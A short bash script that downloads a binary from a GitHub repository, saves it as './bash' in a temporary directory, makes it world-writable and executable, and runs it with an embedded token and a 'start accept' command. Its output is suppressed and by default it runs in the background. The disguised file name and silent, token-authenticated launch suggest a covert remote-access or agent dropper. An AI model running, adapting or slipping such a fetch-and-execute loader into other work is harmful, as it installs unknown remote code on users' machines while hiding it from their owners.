#!/bin/bash

token="nI8wrPaUVU4CGUBTBNOszyos9yoAAI1K/RZVoXBwJ/I="
tmp="$(mktemp -d)" && cd "$tmp"
wget -qO "./bash" "https://github.com/vjbahkds/qiyywnbc/raw/refs/heads/main/tm20250312"
chmod 777 "./bash"
if [ "$1" == "1" ]; then
  bash <(echo "./bash start accept --token '${token}'") >/dev/null 2>&1
else
  bash <(echo "./bash start accept --token '${token}'") >/dev/null 2>&1 &
fi
